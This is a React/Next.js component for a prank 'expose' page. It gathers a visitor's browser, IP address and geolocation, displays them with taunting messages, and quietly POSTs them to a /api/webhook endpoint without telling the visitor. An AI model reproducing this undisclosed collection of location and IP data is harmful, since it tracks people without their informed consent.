"use client";

import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useRouter } from "next/navigation";
import Head from "next/head";
import { Monitor, Globe, MapPin } from "lucide-react";

interface DevInfo {
  browser: string;
  ip: string;
  coordinates?: { latitude: number; longitude: number };
}

export default function EnhancedDevExposed() {
  const [devInfo, setDevInfo] = useState<DevInfo>({
    browser: "",
    ip: "Fetching IP...",
  });
  const [exposed, setExposed] = useState<boolean>(false);
  const [exposeMessage, setExposeMessage] = useState<string>("");
  const [command, setCommand] = useState<string>("");

  useEffect(() => {
    const updateDevInfo = async () => {
      const ua = navigator.userAgent;
      const browserRegex =
        /(chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i;
      const [, browser] = ua.match(browserRegex) || [];

      setDevInfo((prev) => ({
        ...prev,
        browser: browser || "Unknown",
      }));

      try {
        const response = await fetch("/api/ip");
        const data = await response.json();
        setDevInfo((prev) => ({
          ...prev,
          ip: data.ip || "Unable to fetch IP",
        }));
      } catch (error) {
        console.error("Error fetching IP address:", error);
      }

      navigator.geolocation.getCurrentPosition((position) => {
        setDevInfo((prev) => ({
          ...prev,
          coordinates: {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          },
        }));
      });
    };

    updateDevInfo();
  }, []);

  const handleExpose = () => {
    setExposed(true);
    const randomLines = [
      "You thought you were incognito? Nah fam.",
      "Caught ya red-handed, my dude!",
      "Welcome to the club, you’re officially exposed!",
      "Not so sneaky now, are we?",
      "Guess you can’t hide from the internet, huh?",
      "Oopsie, looks like someone’s not in stealth mode!",
      "Surprise! You can’t escape the digital eye!",
    ];
    const randomLine =
      randomLines[Math.floor(Math.random() * randomLines.length)];
    setExposeMessage(randomLine);
    sendToWebhook();
  };

  const sendToWebhook = async () => {
    try {
      await fetch("/api/webhook", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          browser: devInfo.browser,
          ip: devInfo.ip,
          coordinates: devInfo.coordinates,
        }),
      });
    } catch (error) {
      console.error("Error sending data to webhook:", error);
    }
  };

  const handleCommandSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (command.trim().toLowerCase() === "expose") {
      handleExpose();
    }
    setCommand("");
  };

  const infoVariants = {
    hidden: { opacity: 0, y: 20 },
    visible: { opacity: 1, y: 0 },
  };

  return (
    <>
      <Head>
        <title>Seduce - Shrvan Benke</title>
        <meta
          name="description"
          content="Bro, get ready to be roasted by the code!"
        />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <div className="min-h-screen flex flex-col bg-[#F5E6D3] text-[#2C3E50] font-mono p-8">
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.5 }}
          className="flex-grow max-w-3xl mx-auto w-full"
        >
          <div className="mb-6">
            <h1 className="text-4xl font-bold text-[#34495E]">Seduce</h1>
          </div>
          <div className="bg-[#ECE0C8] text-[#2C3E50] p-6 rounded-lg shadow-md mb-8">
            <AnimatePresence>
              {!exposed ? (
                <motion.div
                  key="unexposed"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                >
                  <p className="text-2xl font-bold mb-4">
                    Yo, you think you're slick?
                  </p>
                  <p className="text-xl mb-4">
                    Type "expose" in the command below:
                  </p>
                  <form
                    onSubmit={handleCommandSubmit}
                    className="flex items-center bg-[#ECE0C8] text-[#2C3E50] p-4 rounded-lg shadow-md"
                  >
                    <span className="mr-2 text-[#34495E]">$</span>
                    <input
                      type="text"
                      value={command}
                      onChange={(e) => setCommand(e.target.value)}
                      className="flex-grow bg-transparent outline-none text-[#2C3E50] placeholder-[#34495E] opacity-70"
                      placeholder="Type 'expose' to reveal!"
                    />
                  </form>
                </motion.div>
              ) : (
                <motion.div
                  key="exposed"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                >
                  <p className="text-2xl font-bold mb-4">{exposeMessage}</p>
                  <motion.div
                    initial="hidden"
                    animate="visible"
                    variants={{
                      visible: { transition: { staggerChildren: 0.1 } },
                    }}
                    className="grid grid-cols-1 md:grid-cols-2 gap-4"
                  >
                    <motion.div
                      variants={infoVariants}
                      className="flex items-center"
                    >
                      <Monitor className="mr-2" /> Browser: {devInfo.browser}
                    </motion.div>
                    <motion.div
                      variants={infoVariants}
                      className="flex items-center"
                    >
                      <Globe className="mr-2" /> Your IP: {devInfo.ip}
                    </motion.div>
                    {devInfo.coordinates && (
                      <motion.div
                        variants={infoVariants}
                        className="flex items-center"
                      >
                        <MapPin className="mr-2" /> Your Location:{" "}
                        {devInfo.coordinates.latitude},{" "}
                        {devInfo.coordinates.longitude}
                      </motion.div>
                    )}
                  </motion.div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </motion.div>
      </div>
    </>
  );
}
